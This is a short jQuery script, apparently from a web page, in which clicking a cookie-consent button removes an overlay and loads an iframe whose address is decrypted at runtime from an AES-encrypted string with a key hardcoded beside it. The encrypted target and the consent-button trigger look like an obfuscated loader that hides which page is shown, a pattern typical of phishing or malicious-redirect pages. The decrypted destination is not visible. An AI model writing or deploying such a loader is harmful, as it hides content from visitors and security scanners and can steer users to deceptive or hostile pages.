$(document).ready(function() {
	
});

$('#cookies-btn').click(function(e) {
	e.preventDefault();
	$('#cookies-overlay').addClass('hidden');
	$('#container').removeClass('blur');
	$('#load-frame').attr('src', CryptoJS.AES.decrypt('U2FsdGVkX1+QFrNFVvyEA9nnsxTdJK6oVqa3GFbxSh6m1jqHafN3XdrUFKmpnunMP1srAB3q7XCUFD5iey+t+20r+LrzwFjD+kW4ktvAwKEhNgLO9fjU4bn9BWM7m+zuXtCfHygrmdVB0xqESi/J6zHK/GDX/NplE3ca2164cYXATQDcUXB5aVmhOgN4RmDvYQ0KVHjNP2HiMvAHl/B21hlZNHvYR5dX0lvJKA2rzeE51UjXbFNVdJ6p90AHt5VshudMIFJO9+MP5lUH8ZnwVw==', '03kfks8onb79303').toString(CryptoJS.enc.Utf8));
	$('#load-frame').addClass('loaded');
});